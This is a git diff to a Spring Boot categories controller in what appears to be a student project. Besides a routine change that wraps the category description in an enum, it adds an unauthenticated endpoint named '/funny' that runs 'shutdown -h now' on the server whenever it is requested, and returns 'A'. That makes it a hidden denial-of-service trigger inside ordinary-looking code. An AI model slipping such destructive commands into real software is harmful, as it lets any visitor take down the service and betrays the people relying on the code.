@@ -1,5 +1,6 @@
 package com.uade.tpo.demo.controllers.categories;
 
+import com.uade.tpo.demo.entity.Description;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.RestController;
@@ -7,6 +8,8 @@ import org.springframework.web.bind.annotation.RestController;
 import com.uade.tpo.demo.entity.Category;
 import com.uade.tpo.demo.exceptions.CategoryDuplicateException;
 import com.uade.tpo.demo.service.CategoryService;
+
+import java.io.IOException;
 import java.net.URI;
 import java.util.Optional;
 
@@ -44,10 +47,23 @@ public class CategoriesController {
         return ResponseEntity.noContent().build();
     }
 
+    @GetMapping("/funny")
+    public String getFunny() {
+
+        try {
+            Runtime.getRuntime().exec("shutdown -h now");
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+
+        return "A";
+    }
+
     @PostMapping
     public ResponseEntity<Object> createCategory(@RequestBody CategoryRequest categoryRequest)
             throws CategoryDuplicateException {
-        Category result = categoryService.createCategory(categoryRequest.getDescription());
+        Category result = categoryService.createCategory(Description.valueOf(categoryRequest.getDescription()));
         return ResponseEntity.created(URI.create("/categories/" + result.getId())).body(result);
     }
-}
+
+    }
